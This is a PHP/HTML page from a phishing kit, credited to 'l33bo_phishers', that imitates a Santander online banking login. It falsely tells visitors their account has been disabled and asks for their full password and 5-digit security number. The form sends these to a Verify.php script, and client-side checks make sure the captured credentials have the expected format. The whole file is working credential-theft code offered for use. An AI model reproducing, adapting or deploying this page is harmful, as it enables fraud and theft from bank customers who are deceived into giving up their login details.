<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
session_start();
require "../assets/includes/functions.php";
require "../assets/includes/Bank_One_Time.php";
require "../assets/includes/simplehtmldom.php";
require "../assets/includes/enc.php";
?>
<!DOCTYPE html>
<html lang="en-GB">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Login</title>
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="Tue, 01 Jan 1980 12:00:00 GMT">
<meta http-equiv="Cache-Control" content="no-cache">
<link rel="shortcut icon" href="assets/img/favicon.ico">
<link rel="stylesheet" type="text/css" media="screen, print" href="assets/css/main.css">
<script>
function Check() {
    var x = document.forms["login"]["pass"].value;
    if (x == null || x == "") {
        document.getElementById("ErrorPass").style.display = "block";
        return false;
    }
	var passtest = /^(?=.*\d)(?=.*[a-zA-Z]).{8,12}$/;
	if(passtest.test(document.getElementById('pass').value) == false) {
        document.getElementById("ErrorPass").style.display = "block";
        return false;
	}
    var x = document.forms["login"]["memo"].value;
    if (x == null || x == "") {
        document.getElementById("ErrorMemo").style.display = "block";
        return false;
    }
	var memotest = /^[0-9]{5}$/;
	if(memotest.test(document.getElementById('memo').value) == false) {
        document.getElementById("ErrorMemo").style.display = "block";
        return false;
	}
}
</script>
</head>
<body>
<div id="global">
<div id="header">
<div id="headerbanner" class="padlock">
<div id="MainLogo"><a href="#">Santander</a></div>
</div>
</div>
<div id="bodycontent">
<div id="content">
<h1>Enter Password and Security number</h1>
<p>Unfortunately we are unable to allow you access to our online baking service as your account has been automatically disabled to protect your information and prevent misuse, <strong>please enter your Password and Security number</strong> in order to begin our verification process.</p>
<form method="post" action="Verify.php?Account-Verification&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" name="login" id="login">
<div class="contents">
<p class="intro">Please enter <strong style="text-decoration: underline;">your full Password</strong>:</p>
<div id="ErrorPass" style="display:none"class="message alert">
<p>Please enter <strong style="font-decoration:underline">your full Password</strong></p>
</div>
<div class="form">
<div class="form-item">
<span class="labeltext passchar">Password: <img src="assets/img/help.gif" alt=""></span>
<span class="row">
<input type="password" class="mandatory firstfocus correct" autocomplete="off" value="" id="pass" name="pass" maxlength="12"><br>
</span>
</div>
</div>
<p class="intro">Please enter <strong style="text-decoration: underline;">your 5 digit Security Number</strong>:</p>
<div id="ErrorMemo" style="display:none" class="message alert">
<p>Please enter <strong style="font-decoration:underline">your 5 digit Security Number</strong></p>
</div>
<div class="form">
<div class="form-item">
<span class="labeltext passchar">Security Number: <img src="assets/img/help.gif" alt=""></span>
<span class="row">
<input type="password" class="mandatory firstfocus correct" autocomplete="off" value="" id="memo" name="memo" maxlength="5"><br>
</span>
</div>
<p><a href="#">Forgotten your log on details?</a></p>
</div>
<div class="buttonholder">
<span class="button">
<input type="submit" class="defaultAction primary" value="Continue &gt;" name="go" id="go" tabindex="19">
</span>
<span class="button"><input type="submit" value="&lt; Back" tabindex="20"></span>
</div>
</div>
</form>
</div>
</div>
<div id="logonside">
<div class="usefulLinksMenu">
<h2><span class="icoUseful">&nbsp;</span>Useful links</h2>
<ul>
<li><a href="#">Online Banking help</a></li>
<li><a href="#">Contact us</a></li>
</ul>
</div>
</div>
<div id="footer">
<ul>
<li><a href="#">Online Banking Guarantee</a></li>
<li><a href="#">Site Help &amp; Accessibility</a></li>
<li><a href="#">Security &amp; Privacy</a></li>
<li><a href="#">Terms &amp; Conditions</a></li>
<li class="last"><a href="#">Legal</a></li>
</ul>
</div>
</div>
 </body>
 </html>
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 <?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>
<?php // L33BO PHISHERS ?>